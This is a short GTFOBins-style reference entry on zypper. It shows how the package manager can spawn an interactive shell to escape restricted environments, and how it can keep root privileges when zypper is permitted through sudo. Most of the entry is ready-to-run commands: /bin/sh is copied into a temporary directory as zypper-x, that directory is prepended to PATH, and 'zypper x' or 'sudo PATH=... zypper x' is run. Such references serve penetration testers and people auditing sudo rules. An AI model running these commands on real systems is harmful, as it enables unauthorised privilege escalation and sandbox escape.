# GTFOBin: zypper

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

This requires `/bin/sh` to be copied to `/usr/lib/zypper/commands/zypper-x` and this usually requires elevated privileges.

```
zypper x
```

```
TF=$(mktemp -d)
cp /bin/sh $TF/zypper-x
export PATH=$TF:$PATH
zypper x
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

This requires `/bin/sh` to be copied to `/usr/lib/zypper/commands/zypper-x` and this usually requires elevated privileges.

```
sudo zypper x
```

```
TF=$(mktemp -d)
cp /bin/sh $TF/zypper-x
sudo PATH=$TF:$PATH zypper x
```